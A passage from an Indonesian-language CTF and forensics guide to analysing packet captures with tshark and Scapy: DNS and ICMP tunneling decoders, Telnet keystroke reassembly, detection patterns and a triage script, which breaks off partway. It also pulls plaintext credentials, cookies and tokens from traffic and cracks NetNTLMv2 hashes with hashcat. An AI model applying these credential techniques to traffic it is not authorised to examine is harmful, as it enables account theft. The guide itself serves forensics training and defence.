    Seluruh traffic TLS yang memiliki master key terkait akan didekripsi secara transparan menjadi traffic HTTP standar.

---

### 4.2 Analisis FTP

File Transfer Protocol menggunakan dua koneksi terpisah:

- **Control Channel (Port 21):** Sesi teks perintah interaktif (`USER`, `PASS`, `PORT`, `PASV`, `RETR`, `STOR`).
- **Data Channel (Dinamis / Port 20):** Aliran raw byte file yang dikirimkan.

#### Perbedaan Active vs Passive Mode:

- **Active Mode:** Client membuka port dinamis, lalu mengirim perintah `PORT 192,168,1,10,15,200` ke server. Server yang **aktif menghubungkan diri** balik ke IP/Port client tersebut untuk mengirim data.
- **Passive Mode (Modern):** Client mengirim perintah `PASV`. Server membalas dengan `227 Entering Passive Mode (10,0,0,1,195,80)`. Client yang **menghubungkan diri** ke server pada port `(195 * 256) + 80 = 50000`.

#### Rekonstruksi File Transfer FTP via CLI:

Bash

```
# 1. Cari stream TCP yang membawa paket data FTP (ftp-data)
tshark -r target.pcap -Y 'ftp-data' -T fields -e tcp.stream | sort -nu

# 2. Dump raw stream target (misal stream 3) langsung ke file binary
tshark -r target.pcap -q -z "follow,tcp,raw,3" | tail -n +7 | head -n -1 | xxd -r -p > recovered_ftp_file.bin
file recovered_ftp_file.bin
```

---

### 4.3 Analisis DNS & DNS Tunneling

DNS Tunneling adalah teknik covert channel yang menyisipkan payload biner/teks ke dalam struktur nama subdomain DNS. Client yang terinfeksi mengirim request lookup ke recursive resolver dengan format `<encoded_payload>.<c2-domain>.com`.

text

```
[Infected Client] ---> [DNS Recursive Resolver] ---> [Attacker Authoritative Name Server]
       │                                                         │
       └── Lookup: "ZXhmaWx0cmF0aW9uX2RhdGE=.c2.evil.com" ───────┘
```

#### Karakteristik Utama DNS Tunneling:

1. **Label Length:** Panjang subdomain melebihi batas rata-rata (>30-50 karakter).
2. **High Entropy:** Menggunakan base32/base64/hex encoding (`a1f8c0e29b.domain.com`).
3. **Lookup Volume:** Ratusan hingga ribuan query ke satu base domain yang sama dalam waktu singkat.
4. **Query Type Diversification:** Penggunaan tipe query `TXT`, `NULL`, atau `CNAME` berulang kali untuk mengembalikan data respon dari server C2.

#### Otomasi Deteksi DNS Exfiltration via AWK:

Bash

```
# Filter query DNS yang sangat panjang, urutkan berdasarkan domain
tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | \
awk 'length($1) > 40' | sort -u
```

#### Script Dekoder DNS Tunneling (Python):

Simpan script berikut sebagai `/usr/local/bin/dns_exfil_decode.py`:

Python

```
#!/usr/bin/env python3
import sys
import base64
from scapy.all import rdpcap, DNSQR

def extract_dns_payload(pcap_file, target_domain):
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Gagal membaca PCAP: {e}")
        sys.exit(1)

    extracted_subdomains = []
    seen_queries = set()

    for pkt in packets:
        if pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            if target_domain in qname and qname not in seen_queries:
                seen_queries.add(qname)
                # Ambil subdomain sebelum base domain
                subdomain = qname.replace(f".{target_domain}", "")
                # Buang karakter delimiter titik jika chunk dipecah
                clean_payload = subdomain.replace(".", "")
                extracted_subdomains.append(clean_payload)

    print(f"[*] Terkumpul {len(extracted_subdomains)} chunks payload DNS.")
    full_encoded_str = "".join(extracted_subdomains)

    # Coba dekode Base64
    try:
        # Tambahkan padding '=' jika hilang
        missing_padding = len(full_encoded_str) % 4
        if missing_padding:
            full_encoded_str += '=' * (4 - missing_padding)
        decoded = base64.b64decode(full_encoded_str)
        print("\n[+] Berhasil Decode (Base64 Mode):")
        print(decoded[:500])
        with open("dns_recovered.bin", "wb") as f:
            f.write(decoded)
        print("\n[+] Seluruh file disimpan ke 'dns_recovered.bin'")
        return
    except Exception:
        pass

    # Coba dekode Hex
    try:
        decoded = bytes.fromhex(full_encoded_str)
        print("\n[+] Berhasil Decode (Hex Mode):")
        print(decoded[:500])
        with open("dns_recovered.bin", "wb") as f:
            f.write(decoded)
        print("\n[+] Seluruh file disimpan ke 'dns_recovered.bin'")
        return
    except Exception:
        pass

    print("[-] Gagal decode otomatis. Kemungkinan menggunakan Base32 atau enkripsi kustom.")
    print("Contoh raw payload string:")
    print(full_encoded_str[:150])

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <file.pcap> <base_domain_target>")
        print(f"Example: {sys.argv[0]} capture.pcap c2.evilcorp.com")
        sys.exit(1)
    extract_dns_payload(sys.argv[1], sys.argv[2])
```

Eksekusi:

Bash

```
python3 /usr/local/bin/dns_exfil_decode.py target.pcap c2.evil.com
```

---

### 4.4 Analisis SMTP (Email)

Email ditransmisikan dalam format teks MIME standard (RFC 5322). File attachment disisipkan secara inline menggunakan encoding Base64.

Bash

```
# 1. Tampilkan seluruh alur dialog SMTP
tshark -r target.pcap -Y 'smtp' -T fields -e smtp.req.command -e smtp.req.parameter

# 2. Ekstrak data raw email (termasuk body dan base64 attachment) dari TCP stream terkait
tshark -r target.pcap -Y 'smtp.req.command == "DATA"' -T fields -e tcp.stream
# Misal stream nomor 2:
tshark -r target.pcap -q -z "follow,tcp,ascii,2" > email_dump.txt

# 3. Ekstraksi attachment Base64 dari file text dump
sed -n '/Content-Transfer-Encoding: base64/,/--/p' email_dump.txt | grep -v "Content-" | grep -v "^--" | tr -d '\r\n' | base64 -d > attachment_extracted.bin
file attachment_extracted.bin
```

---

### 4.5 Analisis Telnet (Keystroke Reassembly)

Protokol Telnet mengirimkan input interaktif terminal karakter demi karakter (_byte-per-packet_). Menjalankan perintah `ls -la` akan menghasilkan 6 paket TCP terpisah, yang diselingi kontrol transmisi byte `\r\n` atau escape sequences IAC (`0xFF`).

Jika dianalisis mentah, output tampak terdistorsi akibat penekanan tombol backspace (`\x08` atau `\x7f`).

#### Python Script Reassembler Keystroke Telnet

Simpan sebagai `/usr/local/bin/telnet_reassemble.py`:

Python

```
#!/usr/bin/env python3
import sys
from scapy.all import rdpcap, TCP

def reassemble_telnet(pcap_file):
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

    streams = {}

    for pkt in packets:
        if pkt.haslayer(TCP) and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
            stream_id = (pkt[TCP].sport, pkt[TCP].dport)
            raw_payload = bytes(pkt[TCP].payload)
            if not raw_payload:
                continue

            # Hanya ambil interaksi Client -> Server (dport 23)
            if pkt[TCP].dport == 23:
                if stream_id not in streams:
                    streams[stream_id] = []
                streams[stream_id].append(raw_payload)

    for conn, chunks in streams.items():
        print(f"\n[+] Rekonstruksi Sesi Telnet [Client Port: {conn[0]}]:")
        terminal_buffer = []

        for chunk in chunks:
            # Filter Telnet Command bytes (IAC: 0xFF)
            if chunk.startswith(b'\xff'):
                continue

            for byte in chunk:
                # Handle Backspace (0x08 atau 0x7F)
                if byte in (8, 127):
                    if terminal_buffer:
                        terminal_buffer.pop()
                # Handle Newline / Enter
                elif byte in (10, 13):
                    line = "".join(terminal_buffer)
                    if line.strip():
                        print(f"CMD> {line}")
                    terminal_buffer = []
                # Printable ASCII characters
                elif 32 <= byte <= 126:
                    terminal_buffer.append(chr(byte))

        # Print sisa buffer jika ada
        if terminal_buffer:
            print(f"CMD> {''.join(terminal_buffer)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <telnet_traffic.pcap>")
        sys.exit(1)
    reassemble_telnet(sys.argv[1])
```

Eksekusi:

Bash

```
python3 /usr/local/bin/telnet_reassemble.py telnet_session.pcap
```

---

### 4.6 Analisis ICMP (Data Tunneling)

Paket ping standar sistem operasi membawa payload padding statis yang terduga:

- **Linux `ping`:** 56 byte data berurutan (`0x00 0x01 0x02 ... 0x37` atau timestamp).
- **Windows `ping`:** 32 byte alfabetis tetap (`abcdefghijklmnopqrstuvwabcdefghi`).

Jika field `data.data` pada ICMP Request berisi variasi string panjang, file magic number (`PK\x03\x04`), atau ciphertext, maka ICMP telah digunakan sebagai media transmisi _covert channel_.

#### Python Script ICMP Payload Extractor

Simpan sebagai `/usr/local/bin/icmp_extractor.py`:

Python

```
#!/usr/bin/env python3
import sys
from scapy.all import rdpcap, ICMP, IP

def extract_icmp_payload(pcap_file, output_file):
    packets = rdpcap(pcap_file)
    extracted_bytes = bytearray()
    count = 0

    for pkt in packets:
        # Hanya ambil ICMP Echo Request (type 8)
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
            payload = bytes(pkt[ICMP].payload)
            # Standar Linux ping menyisipkan timestamp di 8/16 byte pertama,
            # Namun pada skenario CTF tooling, data sering ditempatkan langsung di awal payload.
            if len(payload) > 0:
                extracted_bytes.extend(payload)
                count += 1

    print(f"[*] Berhasil memproses {count} paket ICMP Echo Request.")
    with open(output_file, "wb") as f:
        f.write(extracted_bytes)
    print(f"[+] Seluruh payload ({len(extracted_bytes)} bytes) disimpan ke '{output_file}'")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input.pcap> <output.bin>")
        sys.exit(1)
    extract_icmp_payload(sys.argv[1], sys.argv[2])
```

Eksekusi dan analisis hasilnya:

Bash

```
python3 /usr/local/bin/icmp_extractor.py icmp_tunnel.pcap dumped_icmp.bin
file dumped_icmp.bin
strings dumped_icmp.bin | head -n 10
```

---

### 4.7 Analisis SMB & Ekstraksi Hash NTLM

Server Message Block (SMB/SMB2) membawa operasi file sharing Windows dan transaksi autentikasi challenge-response NTLMSSP.

#### Ekstraksi NetNTLMv2 Hash untuk Cracking:

Pada paket `NTLMSSP_AUTH` (Type 3), client mengirimkan hash respons terhadap challenge yang diberikan server (Type 2). Format NetNTLMv2 hash dapat disusun secara manual untuk diproses menggunakan `hashcat`.

Formula NetNTLMv2 Hash:

text

```
username::domain:ServerChallenge:NTLMv2Response_First16Bytes:NTLMv2Response_RemainingBytes
```

Gunakan script automated extraction menggunakan `tshark` dan AWK:

Bash

```
# Filter pesan autentikasi NTLM
tshark -r smb_traffic.pcap -Y 'ntlmssp.messagetype == 3' \
       -T fields -e ntlmssp.auth.username \
                 -e ntlmssp.auth.domain \
                 -e ntlmssp.ntlmresponse
```

Hasil ekstraksi dapat langsung diarahkan ke Hashcat menggunakan Mode 5600:

Bash

```
# Menjalankan cracking NetNTLMv2 via rockyou.txt
hashcat -m 5600 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔑 Bagian 5: Credential Hunting

### 5.1 Kredensial Plaintext Per Protokol

Jalankan perintah terarah berikut untuk memburu kredensial plaintext langsung dari command line:

Bash

```
# 1. HTTP POST Credentials (Login Forms)
tshark -r target.pcap -Y 'http.request.method == "POST"' -T fields \
       -e ip.dst -e http.request.uri -e http.file_data | grep -iE "user|pass|login|pwd|token"

# 2. HTTP Basic Authentication (Otomatis Decode)
tshark -r target.pcap -Y 'http.authorization' -T fields -e http.authorization | \
awk '{print $2}' | sort -u | while read -r line; do echo "$line" | base64 -d; echo ""; done

# 3. FTP Username & Password
tshark -r target.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields \
       -e ip.dst -e ftp.request.command -e ftp.request.arg

# 4. SMTP Authentication (AUTH LOGIN biasanya mengirim username & pass di-encode Base64)
tshark -r target.pcap -Y 'smtp.req.command == "AUTH"' -T fields -e smtp.req.parameter

# 5. POP3 Mail Login
tshark -r target.pcap -Y 'pop.request.command == "USER" || pop.request.command == "PASS"' -T fields \
       -e ip.dst -e pop.request.command -e pop.request.arg

# 6. IMAP Mail Login
tshark -r target.pcap -Y 'imap.request' -T fields -e imap.request | grep -i "LOGIN"
```

---

### 5.2 Cookie, JWT, & Bearer Tokens

Bash

```
# 1. Ekstraksi Cookie HTTP (Sering berisi session identifier PHPSESSID, JSESSIONID)
tshark -r target.pcap -Y 'http.cookie' -T fields -e http.host -e http.cookie | sort -u

# 2. Ekstraksi JSON Web Tokens (Format: eyJ...)
tshark -r target.pcap -Y 'http contains "eyJ"' -T fields -e http.file_data -e http.authorization | \
grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | sort -u

# 3. Ekstraksi Authorization Bearer Headers
tshark -r target.pcap -Y 'http.authorization contains "Bearer"' -T fields -e http.authorization | sort -u
```

---

## 💾 Bagian 6: Rekonstruksi & File Recovery

### 6.1 HTTP File Recovery (Termasuk Chunked Transfer)

Bila transfer HTTP menggunakan header `Transfer-Encoding: chunked`, data tidak dikirim dalam satu ukuran pasti, melainkan dalam pecahan blok heksadesimal. Wireshark/Tshark secara otomatis menangani _de-chunking_ melalui flag export-objects.

Bash

```
# Ekstraksi seluruh objek file via tshark CLI
mkdir -p /tmp/recovered_http
tshark -r target.pcap --export-objects "http,/tmp/recovered_http" -q

# Analisis hasil ekstraksi
ls -la /tmp/recovered_http
for f in /tmp/recovered_http/*; do
    echo "File: $f -> $(file "$f")"
done
```

---

### 6.2 FTP File Recovery Menggunakan `tcpflow`

`tcpflow` adalah command-line utility yang merekonstruksi data aktual dari paket jaringan dan menyimpannya ke dalam file terpisah untuk setiap arah komunikasi (aliran TCP):

Bash

```bash
# 1. Instal tcpflow jika belum terpasang
sudo apt install -y tcpflow

# 2. Rekonstruksi stream dengan output ke folder terisolasi
mkdir -p /tmp/tcpflow_out
tcpflow -r target.pcap -o /tmp/tcpflow_out/ -a
# Flag -a: Analisis mode & buat laporan summary jika didukung

# 3. Pahami Format Nama File Output:
# Format: <src_ip>.<src_port>-<dst_ip>.<dst_port>
# Contoh: 192.168.001.105.00021-010.000.000.200.49152 (file > 100 bytes = kemungkinan payload/dokumen)

# 4. Identifikasi semua file yang berhasil direkonstruksi:
ls -la /tmp/tcpflow_out/
for f in /tmp/tcpflow_out/*; do
    size=$(stat -c%s "$f" 2>/dev/null)
    if [ "$size" -gt 100 ]; then
        echo "[$size bytes] $f -> $(file "$f")"
    fi
done
```

---

## 🚨 Bagian 7: Detection Patterns

### 7.1 Port Scanning Signatures

text

```
[Attacker] ───────── TCP SYN (Port 22) ─────────► [Target]
[Attacker] ◄──────── TCP RST/ACK (Closed) ─────── [Target]
[Attacker] ───────── TCP SYN (Port 80) ─────────► [Target]
[Attacker] ◄──────── TCP SYN/ACK (Open) ───────── [Target]
```

1. **SYN Stealth Scan (`nmap -sS`):** Ribuan paket TCP dengan flags `SYN` murni (tanpa ACK), durasi interval antar paket sangat rendah, diarahkan ke port berturut-turut pada IP tujuan yang sama.
    
    Bash
    
    ```
    tshark -r target.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e ip.dst -e tcp.dstport | sort -u | wc -l
    ```
    
2. **NULL / FIN / XMAS Scan:**
    - **NULL Scan:** Paket TCP tanpa flag sama sekali (`tcp.flags == 0x0000`).
    - **XMAS Scan:** Paket TCP dengan flags FIN, PSH, dan URG aktif bersamaan (`tcp.flags == 0x0029`).

---

### 7.2 Command & Control (C2) Traffic Detection

- **Beaconing Pattern (Interval Teratur):** C2 implant secara berkala mengirimkan request heartbeat ke IP listener penyerang. Terlihat dari delta waktu antar frame yang konstan (misal: tepat setiap 5.0 detik atau memiliki jitter matematis).
    
    Bash
    
    ```
    # Hitung selisih waktu antar frame HTTP POST ke server tertentu
    tshark -r target.pcap -Y 'http.request.method == "POST" && ip.dst == 10.0.0.99' -T fields -e frame.time_delta
    ```
    
- **Data Exfiltration Ratio (Asymmetric Flow):** Volume transfer outbound (Client →→ Server) ratusan kali lebih besar dibandingkan inbound (Server →→ Client), menandakan pencurian data internal.

---

## 🐍 Bagian 8: Analisis Tingkat Lanjut dengan Python Scapy

Scapy adalah modul manipulasi dan inspeksi paket jaringan tingkat rendah di Python. Scapy digunakan saat Wireshark atau Tshark gagal mem-parse protokol binary proprietary atau format non-standar.

### Script 1: Basic Packet Iteration & Protocol Filter

Simpan sebagai `scapy_filter.py`:

Python

```
#!/usr/bin/env python3
from scapy.all import rdpcap, IP, TCP, UDP

def analyze_traffic(pcap_path):
    packets = rdpcap(pcap_path)
    print(f"[*] Total paket dalam capture: {len(packets)}")

    tcp_count = 0
    udp_count = 0

    for idx, pkt in enumerate(packets):
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst

            if pkt.haslayer(TCP):
                tcp_count += 1
                sport = pkt[TCP].sport
                dport = pkt[TCP].dport
                # Cetak hanya paket ke port spesifik (misal port 1337)
                if dport == 1337 or sport == 1337:
                    print(f"[Packet {idx}] Custom TCP 1337: {src}:{sport} -> {dst}:{dport} | Flags: {pkt[TCP].flags}")

            elif pkt.haslayer(UDP):
                udp_count += 1

    print(f"[*] Ringkasan: TCP={tcp_count}, UDP={udp_count}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file.pcap>")
        sys.exit(1)
    analyze_traffic(sys.argv[1])
```

---

### Script 2: Rekonstruksi TCP Stream Manual

Simpan sebagai `scapy_tcp_stream.py`:

Python

```
#!/usr/bin/env python3
import sys
from scapy.all import rdpcap, TCP, Raw

def reconstruct_stream(pcap_path, target_stream_port):
    packets = rdpcap(pcap_path)
    payload_buffer = bytearray()

    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if pkt[TCP].dport == target_stream_port or pkt[TCP].sport == target_stream_port:
                payload_buffer.extend(pkt[Raw].load)

    print(f"[+] Total raw payload terkumpul: {len(payload_buffer)} bytes")
    with open("reconstructed_stream.bin", "wb") as f:
        f.write(payload_buffer)
    print("[+] Disimpan ke 'reconstructed_stream.bin'")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <file.pcap> <port>")
        sys.exit(1)
    reconstruct_stream(sys.argv[1], int(sys.argv[2]))
```

---

### Script 3: Custom Binary Protocol Parser

Bila challenge CTF menggunakan protokol binary buatan (misal header kustom 8 byte: 4 byte Magic `\xDE\xAD\xBE\xEF`, 2 byte Type, 2 byte Data Length).

Simpan sebagai `parse_custom.py`:

Python

```
#!/usr/bin/env python3
import sys
import struct
from scapy.all import rdpcap, TCP, Raw

MAGIC_HEADER = b"\xde\xad\xbe\xef"

def parse_custom_protocol(pcap_path):
    packets = rdpcap(pcap_path)
    for idx, pkt in enumerate(packets):
        if pkt.haslayer(Raw):
            data = pkt[Raw].load
            if data.startswith(MAGIC_HEADER):
                # Unpack: 4 bytes Magic, 2 bytes Type (H), 2 bytes Length (H)
                magic, msg_type, length = struct.unpack("!4sHH", data[:8])
                payload = data[8:8+length]
                print(f"[Frame {idx}] Custom Proto Detected: Type={msg_type}, Length={length}")
                print(f"       Payload (ASCII): {payload.decode('utf-8', errors='replace')}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file.pcap>")
        sys.exit(1)
    parse_custom_protocol(sys.argv[1])
```

---

## 🎯 Bagian 9: 12 Common CTF PCAP Patterns

Berikut adalah 12 pola challenge PCAP yang paling sering ditemui dalam CTF:

### Pattern 1: Flag dalam HTTP GET/POST Response

- **Indikasi:** Web traffic biasa, respons kode 200 OK pada URI tertentu.
- **Tool:** `tshark`
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -Y 'http.response' -T fields -e http.file_data | grep -iE "flag\{|picoCTF\{|HTB\{"
    ```
    
- **Analisis:** String flag langsung dicetak dari body HTML/JSON respons web.

---

### Pattern 2: Credentials FTP Plaintext

- **Indikasi:** Terdapat interaksi port 21 TCP.
- **Tool:** `tshark`
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -Y 'ftp.request.command == "PASS"' -T fields -e ftp.request.arg
    ```
    
- **Analisis:** Kata sandi yang dimasukkan oleh client langsung terlihat dalam format teks terbuka.

---

### Pattern 3: DNS Tunneling dengan Base64 / Hex

- **Indikasi:** Banyak query subdomain panjang ke satu domain otoritatif yang sama.
- **Tool:** `tshark` + `sed` + `base64` / `dns_exfil_decode.py`
- **Command:**
    
    Bash
    
    ```bash
    # Ambil semua label subdomain kecuali 2 level domain terakhir (misal: evil.com)
    tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | \
      sed 's/\.[^.]*\.[^.]*$//' | \
      tr -d '.\n' | \
      base64 -d 2>/dev/null || echo "[!] Gagal decode Base64 standar, coba Hex atau Base32"

    # Atau gunakan script otomatis dns_exfil_decode.py yang sudah disediakan:
    python3 /usr/local/bin/dns_exfil_decode.py target.pcap evil.com
    ```
    
- **Analisis:** Subdomain disambung menjadi string tunggal lalu di-decode langsung untuk mendapatkan file atau pesan rahasia.

---

### Pattern 4: File Gambar dalam Transfer HTTP

- **Indikasi:** Objek MIME type `image/png` atau `image/jpeg` teridentifikasi di hierarki protokol.
- **Tool:** `tshark`
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap --export-objects "http,recovered_images" -q
    ```
    
- **Analisis:** Buka file gambar hasil ekstraksi menggunakan image viewer atau teruskan ke workflow steganography (`[🏛️ Bagian 0: Fondasi Steganography](/docs/steganography)`).

---

### Pattern 5: Sesi Terminal Telnet Interaktif

- **Indikasi:** Traffic mengarah ke port 23 TCP.
- **Tool:** `telnet_reassemble.py`
- **Command:**
    
    Bash
    
    ```
    python3 /usr/local/bin/telnet_reassemble.py target.pcap
    ```
    
- **Analisis:** Skrip menyatukan keystroke karakter per paket dan menampilkan perintah yang diketikkan penyerang secara berurutan.

---

### Pattern 6: ICMP Data Tunneling Payload

- **Indikasi:** Ukuran paket ping tidak wajar (>64 bytes), protocol hierarchy menunjukkan layer `data` di bawah `icmp`.
- **Tool:** `icmp_extractor.py`
- **Command:**
    
    Bash
    
    ```
    python3 /usr/local/bin/icmp_extractor.py target.pcap raw_icmp.bin
    ```
    
- **Analisis:** Periksa file biner hasil ekstraksi menggunakan `binwalk -e raw_icmp.bin` atau `strings`.

---

### Pattern 7: File Tersembunyi di SMB File Share

- **Indikasi:** Terdapat request SMB2 `Create` dan `Read`.
- **Tool:** `tshark`
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap --export-objects "smb,recovered_smb" -q
    ```
    
- **Analisis:** File yang ditransfer via jaringan internal Windows otomatis terekstraksi ke folder tujuan.

---

### Pattern 8: SMTP Email dengan File Attachment

- **Indikasi:** Protokol port 25/587 aktif dengan transmisi data MIME berukuran besar.
- **Tool:** Wireshark / TShark TCP Stream Dump
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -q -z "follow,tcp,ascii,0" > email.txt
    ```
    
- **Analisis:** Cari boundary attachment, isolasi teks Base64, dan simpan kembali ke format binary aslinya (`base64 -d`).

---

### Pattern 9: Multi-Protocol Pivot (HTTP Mendownload Kredensial →→ Login FTP)

- **Indikasi:** Ada akses web ke file teks/konfigurasi, diikuti sesi koneksi FTP ke server berbeda.
- **Tool:** TShark Cross-Protocol Search
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -Y 'http.request || ftp.request' -T fields -e frame.time -e ip.dst -e http.request.uri -e ftp.request.command -e ftp.request.arg
    ```
    
- **Analisis:** Ambil password dari log request HTTP, gunakan password tersebut untuk memfilter dan memvalidasi aktivitas transfer file pada session FTP.

---

### Pattern 10: Custom Binary Protocol Menggunakan Port Non-Standar

- **Indikasi:** Traffic TCP ke port tidak umum (misal 9999 atau 31337) dengan payload yang diawali pola byte statis.
- **Tool:** `parse_custom.py` (Scapy)
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -d tcp.port==9999,echo -T fields -e data.data
    ```
    
- **Analisis:** Lakukan mapping struktur packet header menggunakan hex viewer (`xxd` atau `ghex`) lalu buat parser binary Scapy/Python.

---

### Pattern 11: HTTPS Traffic Dilengkapi SSLKEYLOGFILE

- **Indikasi:** Seluruh web traffic terenkripsi dalam layer TLS, tetapi file lampiran CTF menyertakan `sslkeylog.txt`.
- **Tool:** `tshark` dengan opsi TLS Keylog
- **Command:**
    
    Bash
    
    ```
    tshark -r target.pcap -o "tls.keylog_file:sslkeylog.txt" -Y 'http' -T fields -e http.request.uri
    ```
    
- **Analisis:** TShark mendekripsi payload TLS secara on-the-fly, memungkinkan inspeksi plaintext HTTP request dan response.

---

### Pattern 12: Covert Channel Menggunakan TCP Sequence Number

- **Indikasi:** Paket TCP SYN ke satu port tertutup tanpa kelanjutan handshake, tetapi Initial Sequence Number (ISN) bernilai ASCII yang valid.
- **Tool:** Python Scapy
- **Command:**
    
    Bash
    
    ```
    python3 -c '
    from scapy.all import *
    pkts = rdpcap("target.pcap")
    chars = [chr(p[TCP].seq) for p in pkts if p.haslayer(TCP) and p[TCP].flags == "S"]
    print("".join(chars))
    '
    ```
    
- **Analisis:** Nomor sequence TCP diekstrak dan langsung dikonversi menjadi representasi karakter teks ASCII flag.

---

## 🗺️ Bagian 10: Master PCAP Decision Tree

Gunakan diagram alur keputusan ini untuk mengeksekusi investigasi PCAP secara terstruktur:

text

```
                            [ FILE PCAP DITERIMA ]
                                       │
                      ┌────────────────┴────────────────┐
                      ▼                                 ▼
            [ capinfos metadata ]             [ tshark -z io,phs ]
          (Cek durasi, packet count)         (Petakan sebaran protokol)
                                       │
         ┌──────────────┬──────────────┼──────────────┬──────────────┐
         ▼              ▼              ▼              ▼              ▼
     [ HTTP ]        [ DNS ]        [ FTP ]       [ TELNET ]     [ ICMP ]
         │              │              │              │              │
         ├► Export      ├► Hitung qry  ├► Cek USER/   ├► Follow TCP  ├► Cek data
         │  Objects     │  length      │  PASS        │  stream      │  payload
         ├► Cek Form    ├► Cek domain  ├► Follow      ├► Ekstrak     ├► Dump raw
         │  POST Data   │  entropy     │  ftp-data    │  keystrokes  │  hex bytes
         └► Cari Auth   └► Decode      └► Carve file  └► Rekonstruksi└► Analisis
            Headers        Base64/Hex     binary         bash cmd       file type
                                       │
                                       ▼
                         [ PROTOKOL TERENKRIPSI? ]
                                       │
                      ┌────────────────┴────────────────┐
                      ▼                                 ▼
                 [ TLS / HTTPS ]                  [ SMB / NTLM ]
                      │                                 │
                      ├► Cek opsi Keylog file           ├► Ekspor SMB Objects
                      ├► Cek SNI Domain Name            ├► Filter ntlmssp.messagetype==3
                      └► Dekripsi via -o tls.keylog     └► Ekstrak hash untuk Hashcat
```

---

## 🤖 Bagian 11: Automation Script (pcap_triage.sh)

Simpan script berikut sebagai `/usr/local/bin/pcap_triage.sh` dan berikan izin eksekusi (`chmod +x`):

Bash

```
#!/bin/bash
# ==============================================================================
# PCAP Automated Triage Script for CTF & Incident Response
# Target OS: Parrot OS / Debian-based
# ==============================================================================

if [ -z "$1" ]; then
    echo "Usage: $0 <capture_file.pcap/pcapng>"
    exit 1
fi

PCAP="$1"

if [ ! -f "$PCAP" ]; then
    echo "[-] File $PCAP tidak ditemukan!"
    exit 1
fi

echo "=============================================================================="
echo "                  AUTOMATED NETWORK FORENSICS TRIAGE REPORT                  "
echo "=============================================================================="
echo "[*] Target File: $PCAP"
echo ""

# 1. METADATA SUMMARY
echo "[+] 1. METADATA & INTEGRITAS FILE"
capinfos -c -s -d -u "$PCAP" 2>/dev/null
echo ""

# 2. PROTOCOL HIERARCHY
echo "[+] 2. DISTRIBUSI HIERARKI PROTOKOL"
tshark -r "$PCAP" -q -z io,phs
echo ""

# 3. TOP TALKERS (CONVERSATIONS)
echo "[+] 3. TOP 5 IP CONVERSATIONS"
tshark -r "$PCAP" -q -z conv,ip | head -n 15
echo ""

# 4. INSTANT FLAG SEARCH
echo "[+] 4. PENCARIAN PATTERN FLAG (Quick Grep)"
FLAGS_FOUND=$(tshark -r "$PCAP" \
  -Y 'frame contains "flag{" || frame contains "FLAG{" || frame contains "picoCTF{" || frame contains "HTB{"' \
  -T fields -e frame.number -e text 2>/dev/null)
if [ -n "$FLAGS_FOUND" ]; then
    echo "[!] FLAG TERDETEKSI SECARA LANGSUNG:"
    echo "$FLAGS_FOUND"
else
    echo "[-] Flag tidak ditemukan pada layer aplikasi teks mentah."
fi
echo ""

# 5. PLAINTEXT CREDENTIAL HUNTING
echo "[+] 5. PEMBURUAN KREDENSIAL PLAINTEXT"

echo "  [-] Memeriksa HTTP Basic Authentication..."
tshark -r "$PCAP" -Y 'http.authorization contains "Basic"' -T fields -e ip.dst -e http.authorization 2>/dev/null | sort -u | while read -r line; do
    auth_b64=$(echo "$line" | awk '{print $NF}')
    echo "      [HTTP AUTH] Dest: $(echo "$line" | awk '{print $1}') -> Decoded: $(echo "$auth_b64" | base64 -d 2>/dev/null)"
done

echo "  [-] Memeriksa FTP Authentication..."
tshark -r "$PCAP" -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e ip.dst -e ftp.request.command -e ftp.request.arg 2>/dev/null | sort -u | while read -r line; do
    echo "      [FTP CRED] $line"
done

echo "  [-] Memeriksa POP3/IMAP Authentication..."
tshark -r "$PCAP" -Y 'pop.request.command == "USER" || pop.request.command == "PASS" || imap.request contains "LOGIN"' \
  -T fields -e ip.dst -e text 2>/dev/null | sort -u | head -n 5

echo ""

# 6. ANOMALY DETECTION
echo "[+] 6. DETEKSI ANOMALI & COVERT CHANNELS"

# DNS Anomaly
DNS_COUNT=$(tshark -r "$PCAP" -Y 'dns.flags.response == 0' 2>/dev/null | wc -l)
LONG_DNS=$(tshark -r "$PCAP" -Y 'dns.flags.response == 0' -T fields -e dns.qry.name 2>/dev/null | awk 'length($1) > 50' | wc -l)
echo "  [-] Total DNS Queries: $DNS_COUNT"
if [ "$LONG_DNS" -gt 0 ]; then
    echo "      [!] PERINGATAN: Ditemukan $LONG_DNS DNS queries dengan panjang > 50 karakter! (Indikasi Tunneling)"
fi

# ICMP Payload
ICMP_ANOMALY=$(tshark -r "$PCAP" -Y 'icmp.type == 8 && data.len > 48' 2>/dev/null | wc -l)
